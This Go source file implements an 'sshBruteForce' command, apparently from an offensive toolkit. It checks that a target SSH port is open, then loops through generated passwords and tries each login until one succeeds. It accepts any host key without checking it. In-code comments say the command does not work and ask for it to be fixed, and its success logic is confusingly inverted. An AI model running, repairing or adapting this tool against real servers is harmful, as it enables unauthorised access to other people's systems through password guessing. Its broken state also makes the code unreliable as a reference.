package commands

import (
	"fmt"
	"net"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/anvie/port-scanner"
	"github.com/fatih/color"
	"github.com/ngirot/BruteForce/bruteforce/words"
	"golang.org/x/crypto/ssh"
)

type SshBruteForceCommand struct {
	name string
}

func (command SshBruteForceCommand) GetName() string {
	return "sshBruteForce"
}

func (command SshBruteForceCommand) GetDescription() string {
	return color.YellowString("A bruteforce attack on ssh servers")
}

func (command SshBruteForceCommand) String() string {
	return "<Command 'sshBruteForce'>"
}

func (command SshBruteForceCommand) Execute(kill chan bool, args []string) {
	/*
		This command is not working. fix it please
	*/

	if len(args) < 2 {
		fmt.Fprintln(color.Output, color.RedString("Usage: <address:port> <user>"))
		return
	}

	address := args[0]
	user := args[1]

	if strings.Contains(address, ":") {
		_, err := strconv.Atoi(strings.Split(address, ":")[1])
		if err != nil {
			fmt.Println("I need a valid port")
			return
		}
	} else {
		fmt.Println("Please give the address and the port me :)")
		return
	}

	ps := portscanner.NewPortScanner(strings.Split(address, ":")[0], 2*time.Second, 5)
	port, _ := strconv.Atoi(strings.Split(address, ":")[1])
	if ps.IsOpen(port) {
		fmt.Println("The port " + strconv.Itoa(port) + " is opened. Good job.")
	} else {
		fmt.Println("The port " + strconv.Itoa(port) + " is not opened")
		return
	}

	var tries = 0

	var worder = words.NewWorder(words.DefaultAlphabet(), numberOfChans, 0)
	for {
		select {
		case <-kill:
			fmt.Println("\nAborted.")
			return
		default:
			var curPwd = worder.Next()
			result, err := trySSHConnection(address, user, curPwd)
			tries++
			if !result {
				fmt.Printf("Success, your password is: %s\nTook %d tries\n", curPwd, tries)
				return
			}
			fmt.Fprintf(color.Output, "\r\rTook "+color.HiCyanString("%d")+" tries without result. password: %s cuz: %s", tries, color.CyanString(curPwd), color.RedString(err.Error()))
		}
	}
}

var numberOfChans = runtime.NumCPU()*2 + 1

func trySSHConnection(address string, user string, pass string) (result bool, erro error) {
	config := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(pass), // THIS HERE IS NOT WORKING!
		},
		HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
			return nil
		},
	}

	client, err := ssh.Dial("tcp", address, config)
	defer func() {
		if client != nil {
			client.Close()
		}
	}()
	erro = err
	result = err != nil
	return
}
